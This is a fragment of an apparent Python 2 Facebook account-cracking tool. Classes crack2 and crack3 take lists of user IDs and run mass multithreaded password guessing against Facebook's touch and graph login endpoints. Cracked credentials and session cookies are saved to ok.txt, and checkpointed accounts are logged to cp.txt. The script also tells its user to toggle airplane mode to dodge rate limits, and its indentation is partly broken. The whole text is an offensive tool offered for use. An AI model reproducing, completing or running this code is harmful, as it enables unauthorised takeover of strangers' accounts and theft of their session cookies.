					print("\r   \033[1;92m[XSAN=CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;92m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;92m╠══\033[0;97m[•]  choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;92m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
				print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
			print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r   [XSAN=OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   \033[1;92m[XSAN=CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;92m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;92m╠══\033[0;97m[•]  choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1:92m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[1;92m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;92m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
				print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
				print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                                print ("\033[1;92m──────────────────────────────────────────────────────────")
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			print ("\033[1;92m╔══\033[0;97m[•] Crack Started...")
			print ("\033[1;92m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Account [CP] saved to : cp.txt")
			print ("\033[1;92m╚══\033[0;97m[•] Use (FLIGHT) mode every  10 minutes")     
                        print ("\033[1;92m──────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph_fb(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print("\r   [XSAN=OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   \033[1;92m[XSAN=CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
if __name__=='__main__':
  menu()

 